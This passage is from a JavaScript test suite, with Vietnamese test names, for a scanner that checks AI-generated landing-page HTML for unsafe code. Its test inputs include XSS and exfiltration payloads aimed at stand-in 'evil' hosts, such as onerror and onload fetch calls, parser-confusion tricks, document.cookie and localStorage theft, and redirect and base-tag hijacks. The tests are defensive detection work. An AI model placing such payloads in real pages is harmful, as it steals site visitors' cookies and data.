  it('thẻ chữ thô (iframe/noscript/title/style/textarea) không che được script thật sau đó', () => {
    expect(kinds(`<iframe><a href="</iframe>${PAYLOAD}<a href=""></iframe>`)).toContain('net');
    expect(kinds(`<noscript><p title="</noscript>${PAYLOAD}"></noscript>`)).toContain('net');
    expect(kinds(`<title><a href="</title>${PAYLOAD}<a href=""></title>`)).toContain('net');
    expect(kinds(`<style><a href="</style>${PAYLOAD}<a href=""></style>`)).toContain('net');
    expect(kinds(`<textarea><a href="</textarea>${PAYLOAD}<a href=""></textarea>`)).toContain('net');
  });

  it('SVG: <title>/<style> là thẻ thường trong foreign content → handler bên trong vẫn bị soi', () => {
    expect(kinds(`<svg><title><img src=x onerror="fetch('${evil}')"></title></svg>`)).toContain('net');
    expect(kinds(`<svg><style><img src=x onerror="fetch('${evil}')"></style></svg>`)).toContain('net');
  });

  it('thuộc tính trùng tên: trình duyệt giữ cái đầu tiên', () => {
    expect(kinds('<a href="/ok" href="javascript:alert(1)">x</a>')).toEqual([]);
    expect(kinds('<a href="javascript:alert(1)" href="/ok">x</a>')).toEqual(['jsurl']);
  });

  it('thẻ chưa đóng khi hết chuỗi bị trình duyệt bỏ → không tính', () => {
    expect(kinds(`<p>x</p><img src=x onerror="fetch('${evil}')"`)).toEqual([]);
  });

  it('tách thuộc tính bằng `/` và khoảng trắng kiểu SVG: <svg/onload=…>', () => {
    expect(kinds(`<svg/onload="fetch('${evil}')">`)).toEqual(['net']);
    // `/` trong giá trị KHÔNG nháy thuộc về giá trị (đúng tokenizer HTML5): src="x/onerror=fetch(…)", không có handler.
    expect(kinds(`<img/src=x/onerror=fetch('${evil}')>`)).toEqual([]);
  });

  it('trang lớn quét xong nhanh, không bùng nổ với thẻ chữ thô lồng nhau', () => {
    const big = '<div class="a" id="b">chữ</div>\n'.repeat(15000) + '<style>'.repeat(5000);
    const started = Date.now();
    findUnsafeLandingHtml(big);
    expect(Date.now() - started).toBeLessThan(2000);
  });
});

// ---------------------------------------------------------------------------------------------------------
// Sửa landing: so với bản cũ
// ---------------------------------------------------------------------------------------------------------
describe('landingHtmlSafety — sửa landing: so với bản cũ (baseline)', () => {
  const lpTrack = '<script src="https://founderai.biz/lp-track.js" data-api-base="https://api.founderai.biz/api" data-slug="abc" defer></script>';
  const capture = '<script src="https://founderai.biz/founderai-capture.js" data-api-base="https://api.founderai.biz/api" data-slug="abc" defer></script>';
  const formEmbed = '<script src="https://founderai.biz/form-embed.js" defer></script>';

  it('script hệ thống (lp-track, founderai-capture, form-embed) đã có ở bản cũ → giữ nguyên là qua', () => {
    const old = page('<p>a</p>' + formEmbed + lpTrack + capture);
    const next = page('<p>b</p>' + formEmbed + lpTrack + capture);
    expect(findUnsafeLandingHtml(next, { baselineHtml: old })).toEqual([]);
  });

  it('AI bỏ bớt script hệ thống (lúc lưu hệ thống chèn lại) → không phải lỗi an toàn', () => {
    const old = page('<p>a</p>' + lpTrack + capture);
    expect(findUnsafeLandingHtml(page('<p>a</p>'), { baselineHtml: old })).toEqual([]);
  });

  it('script có src của khách đã có (vd. thư viện) → giữ nguyên qua; thêm src lạ khác → bị bắt', () => {
    const old = page('<script src="https://cdn.example.com/a.js"></script>');
    const next = page('<script src="https://cdn.example.com/a.js"></script><script src="https://evil.test/b.js"></script>');
    const found = findUnsafeLandingHtml(next, { baselineHtml: old });
    expect(found).toHaveLength(1);
    expect(found[0].sample).toContain('evil.test/b.js');
  });

  it('script inline của khách đã có fetch/localStorage: giữ nguyên (kể cả khác khoảng trắng) → qua; thêm fetch MỚI → bị bắt', () => {
    const old = page(
      "<script>\n  var seen = localStorage.getItem('popup');\n  fetch('https://api.cua-khach.vn/ping');\n</script>"
    );
    const same = page("<script>var seen = localStorage.getItem('popup'); fetch('https://api.cua-khach.vn/ping');</script>");
    expect(findUnsafeLandingHtml(same, { baselineHtml: old })).toEqual([]);
    // fetch lạ thêm vào MỘT KHỐI SCRIPT MỚI: chỉ khối mới bị báo (api.cua-khach.vn là host có trong bản cũ nên khối cũ vẫn qua).
    const addedBlock = page(
      "<script>var seen = localStorage.getItem('popup'); fetch('https://api.cua-khach.vn/ping');</script><script>fetch('https://evil.test/steal', { body: seen });</script>"
    );
    const found = findUnsafeLandingHtml(addedBlock, { baselineHtml: old });
    expect(found.map((f) => f.kind)).toEqual(['net']);
    expect(found[0].sample).toContain('evil.test/steal');
    // fetch lạ thêm vào CÙNG khối: tính theo khối nên mọi lời gọi mạng của khối đó đều thành "mới" — vẫn bị bắt.
    const sameBlock = page(
      "<script>var seen = localStorage.getItem('popup'); fetch('https://api.cua-khach.vn/ping'); fetch('https://evil.test/steal', { body: seen });</script>"
    );
    const foundSame = findUnsafeLandingHtml(sameBlock, { baselineHtml: old });
    expect(foundSame.map((f) => f.kind)).toEqual(['net', 'net']);
    expect(foundSame.some((f) => f.sample.includes('evil.test/steal'))).toBe(true);
  });

  it('bản cũ đã có khối gọi mạng bị coi là lạ (đích động): giữ nguyên qua; đổi sang URL lạ KHÁC cùng câu lệnh → bị bắt', () => {
    const old = page('<script>var u = window.TARGET; fetch(u, { body: d })</script>');
    expect(findUnsafeLandingHtml(old, { baselineHtml: old })).toEqual([]);
    const changed = page(`<script>var u = '${evil}/new'; fetch(u, { body: d })</script>`);
    expect(kinds(changed, { baselineHtml: old })).toEqual(['net']);
  });

  it('sửa phần giao diện của script cũ (đổi số giây) KHÔNG bị chặn dù script có setTimeout/handler', () => {
    const old = page('<script>setTimeout(function(){ document.getElementById("p").classList.remove("hidden"); }, 5000);</script>');
    const next = page('<script>setTimeout(function(){ document.getElementById("p").classList.remove("hidden"); }, 8000);</script>');
    expect(findUnsafeLandingHtml(next, { baselineHtml: old })).toEqual([]);
  });

  it('host trong bản cũ được phép làm đích chuyển trang trong bản mới', () => {
    const old = page('<a href="https://shop.cua-khach.vn/gio-hang">Giỏ</a>');
    const next = page('<a href="https://shop.cua-khach.vn/gio-hang">Giỏ</a><script>document.getElementById("b").onclick = function(){ window.location.href = "https://shop.cua-khach.vn/mua"; };</script>');
    expect(findUnsafeLandingHtml(next, { baselineHtml: old })).toEqual([]);
    expect(kinds(next.replace('shop.cua-khach.vn/mua', 'evil.test/mua'), { baselineHtml: old })).toEqual(['redirect']);
  });

  it('kẻ gian thêm bản "giả" của lp-track.js từ tên miền khác vào trang vốn có lp-track.js thật → bị bắt', () => {
    const old = page('<p>a</p>' + lpTrack);
    const next = page('<p>a</p>' + lpTrack + '<script src="https://evil.test/lp-track.js"></script>');
    expect(kinds(next, { baselineHtml: old })).toEqual(['script']);
  });

  it('form action ngoài / javascript: / iframe lạ / meta refresh / base đã có ở bản cũ → giữ nguyên qua; đổi → bị bắt', () => {
    const old = page(
      '<form action="https://hooks.example.com/f" method="post"></form><a href="javascript:void(0)">x</a>' +
        '<iframe src="https://widget.cua-khach.vn/x"></iframe><meta http-equiv="refresh" content="3600"><base href="https://a.cua-khach.vn/">'
    );
    expect(findUnsafeLandingHtml(old, { baselineHtml: old })).toEqual([]);
    expect(kinds(old.replace('hooks.example.com', 'evil.test'), { baselineHtml: old })).toEqual(['action']);
    expect(kinds(old.replace('void(0)', 'alert(1)'), { baselineHtml: old })).toEqual(['jsurl']);
    expect(kinds(old.replace('content="3600"', 'content="0;url=https://evil.test"'), { baselineHtml: old })).toEqual(['meta']);
    expect(kinds(old.replace('https://a.cua-khach.vn/', 'https://evil.test/'), { baselineHtml: old })).toEqual(['base']);
  });

  it('`<script/>` tự đóng KHÔNG BAO GIỜ được bản cũ che chở', () => {
    const old = page('<svg><script/></svg>');
    expect(kinds(old, { baselineHtml: old })).toContain('script');
  });
});

describe('landingHtmlSafety — lỗi trả về', () => {
  it('assertLandingHtmlSafe ném 422 mã LANDING_UNSAFE_OUTPUT, câu tiếng Việt, không lộ regex/hàm', () => {
    let err;
    try {
      assertLandingHtmlSafe(`<script>fetch('${evil}', { body: document.cookie })</script><button onclick="location.href='${evil}'">x</button>`);
    } catch (e) {
      err = e;
    }
    expect(err).toBeDefined();
    expect(err.status).toBe(422);
    expect(err.code).toBe(LANDING_UNSAFE_OUTPUT_CODE);
    expect(err.message).toMatch(/AI vừa thêm/);
    expect(err.message).toMatch(/mã gọi mạng tới địa chỉ lạ hoặc không rõ đích/);
    expect(err.message).toMatch(/đọc cookie của trang/);
    expect(err.message).toMatch(/chuyển khách hoặc gán đường dẫn sang địa chỉ lạ/);
    expect(err.message).toMatch(/trình soạn HTML/);
    expect(err.details.findings.map((f) => f.kind).sort()).toEqual(['net', 'redirect', 'secret']);
  });

  it('HTML sạch → không ném; mã giao diện → không ném', () => {
    expect(() => assertLandingHtmlSafe(page('<p>ok</p>'))).not.toThrow();
    expect(() => assertLandingHtmlSafe(page('<button onclick="closeZaloPopup()">x</button>' + TAILWIND_CONFIG_REAL))).not.toThrow();
  });

  it('allowedSourceText được truyền qua assertLandingHtmlSafe', () => {
    const html = page('<script>location.href = "https://shop.cua-toi.vn/x"</script>');
    expect(() => assertLandingHtmlSafe(html)).toThrow(expect.objectContaining({ code: LANDING_UNSAFE_OUTPUT_CODE }));
    expect(() => assertLandingHtmlSafe(html, { allowedSourceText: 'https://shop.cua-toi.vn' })).not.toThrow();
  });

  it('buildUnsafeRetryRule: nói rõ mã giao diện được, cấm mã lấy dữ liệu; sinh mới không nhắc "script đã có sẵn"; sửa thì có', () => {
    const f = [{ kind: 'net', sample: 'x' }];
    const gen = buildUnsafeRetryRule(f, { regenerateWhat: 'Sinh lại toàn bộ trang' });
    expect(gen).not.toMatch(/ĐÃ CÓ SẴN/);
    expect(gen).toMatch(/Mã giao diện đơn giản .* thì được/);
    expect(gen).toMatch(/fetch, XMLHttpRequest, sendBeacon, WebSocket/);
    expect(buildUnsafeRetryRule(f, { regenerateWhat: 'Sinh lại kết quả sửa', hasExistingHtml: true })).toMatch(/ĐÃ CÓ SẴN/);
    expect(describeUnsafeKinds([{ kind: 'net' }, { kind: 'redirect' }, { kind: 'net' }])).toBe('net,redirect');
    expect(buildUnsafeOutputError([{ kind: 'zzz', sample: '' }]).message).toMatch(/cấu trúc HTML bất thường/);
  });
});

describe('landingHtmlScan — tokenizer', () => {
  it('đọc thuộc tính có/không nháy, tách bằng `/`, giữ cái đầu tiên, tên viết thường', () => {
    const [tok] = scanHtmlTags('<IMG/SRC=a.png ALT="x y" alt=z DATA-X=\'1\'>');
    expect(tok.name).toBe('img');
    expect(getAttr(tok, 'src')).toBe('a.png');
    expect(getAttr(tok, 'alt')).toBe('x y');
    expect(getAttr(tok, 'data-x')).toBe('1');
    expect(getAttr(tok, 'nope')).toBeNull();
  });

  it('giải mã thực thể số/tên thường gặp; tên lạ giữ nguyên', () => {
    expect(decodeHtmlEntities('&#106;&#x61;va&Tab;&colon;&amp;&lt;&unknown;')).toBe('java\t:&<&unknown;');
    expect(decodeHtmlEntities('&#0;&#xD800;&#x110000;')).toHaveLength(3);
  });

  it('nội dung thẻ script nằm ở token.content', () => {
    const tokens = scanHtmlTags('<script>var a = 1 < 2;</script><p>x</p>');
    expect(tokens[0]).toMatchObject({ type: 'start', name: 'script', content: 'var a = 1 < 2;' });
  });
});
